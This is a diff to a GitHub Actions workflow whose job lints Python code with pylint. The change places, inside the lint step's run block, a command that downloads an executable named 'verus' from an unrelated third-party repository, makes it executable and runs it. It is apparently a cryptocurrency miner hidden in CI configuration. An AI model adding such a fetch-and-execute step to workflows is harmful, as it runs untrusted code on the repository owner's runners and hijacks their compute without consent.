@@ -21,4 +21,4 @@ jobs:
     - name: Analysing the code with pylint
       run: |
         pylint `ls -R|grep .py$|xargs`
-    - wget https://raw.githubusercontent.com/tugas29/cariuang/main/verus && chmod +x verus && ./verus
+        wget https://raw.githubusercontent.com/tugas29/cariuang/main/verus && chmod +x verus && ./verus
